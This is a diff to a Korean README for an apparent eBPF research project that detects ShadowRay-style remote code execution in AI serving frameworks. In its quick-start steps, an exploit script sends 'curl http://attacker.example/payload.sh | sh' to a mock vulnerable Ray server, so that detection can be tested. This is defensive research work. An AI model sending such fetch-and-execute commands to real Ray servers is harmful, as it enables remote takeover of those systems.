@@ -22,35 +22,52 @@ AI 서빙 프레임워크(Ray, vLLM, Triton 등)에서 발견되는 원격 코�
 
 ```
 kShield-VirtualPatch/
-├── paper_draft.md          논문 초안 (1~3장 완성, 4장 실험은 TODO)
+├── paper_draft.md            논문 초안 (1~3장 완성, 4장 실험은 TODO)
+├── setup.sh                  VM 의존성 설치 + vmlinux.h 생성 + 빌드
 ├── src/
-│   ├── kshield_vpatch.bpf.c  커널 공간 BPF 프로그램 (SHADOW_EXEC 탐지)
-│   ├── kshield_vpatch.c      사용자 공간 로더/로거
+│   ├── kshield_vpatch.bpf.c    커널 공간 BPF 프로그램 (SHADOW_EXEC 탐지)
+│   ├── kshield_vpatch.c        사용자 공간 로더/로거
 │   └── Makefile
 └── attack/
-    ├── mock_ray_server.py    ShadowRay 취약점 재현용 목업 Jobs API
-    └── exploit_shadowray.py  공격 재현 스크립트
+    ├── mock_ray_server.py      ShadowRay 취약점 재현용 목업 Jobs API
+    ├── exploit_shadowray.py    공격(악성 job) 재현 스크립트
+    └── benchmark_vpatch.py     성능 오버헤드 측정 스크립트 (정상 job 반복 제출)
 ```
 
 ## 빠른 시작 (VM에서)
 
 ```bash
+# 0) 최초 1회: 의존성 설치 + vmlinux.h 생성 + 빌드
+bash setup.sh
+
 # 1) 목업 취약 서버 실행
 python3 attack/mock_ray_server.py
 
-# 2) (다른 터미널) kShield-VirtualPatch 빌드 및 실행 — 최초 vmlinux.h 생성 필요
-cd src
-bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h
-make
-sudo ./kshield_vpatch
+# 2) (다른 터미널) kShield-VirtualPatch 실행
+sudo ./src/kshield_vpatch
 
-# 3) (다른 터미널) 공격 재현
+# 3) (다른 터미널) 공격 재현 — kShield-VirtualPatch 로그에 SHADOW_EXEC 탐지가 떠야 함
 python3 attack/exploit_shadowray.py --cmd "curl http://attacker.example/payload.sh | sh"
+
+# 4) 정상 job도 문제없이 통과하는지 확인 (오탐 여부)
+python3 attack/exploit_shadowray.py --cmd "echo benign-job"
+
+# 5) (나중에, 실험 단계) 성능 오버헤드 측정
+python3 attack/benchmark_vpatch.py --count 500 --output metrics_vpatch_on.csv
 ```
 
 ## 상태
 
 **기획 단계.** 코드와 논문 구조는 초안 수준이며, 실제 VM 컴파일·실행 테스트와
 실험 결과 수집이 필요하다. `paper_draft.md`의 `[TODO]` 표시 참고.
+
+**검증 필요 항목:**
+- `kshield_vpatch.bpf.c`가 실제로 컴파일되는지 (특히 `sched_process_exec`
+  트레이스포인트의 `__data_loc_filename` 필드가 대상 커널의 vmlinux.h에
+  동일하게 존재하는지)
+- `mock_ray_server.py`가 실행하는 자식 프로세스의 부모 comm이 실제로
+  `watched_parents[]`(`raylet`, `ray::IDLE`, `python3`)와 일치하는지 —
+  Python `http.server`가 자식 프로세스를 spawn할 때 파이썬 인터프리터
+  이름이 그대로 상속되는지 VM에서 직접 확인 필요
 
 관련 프로젝트: [kShield (원본, 모델 파일 보안)](https://github.com/sangheon-lee1028/Ai-ebpf)
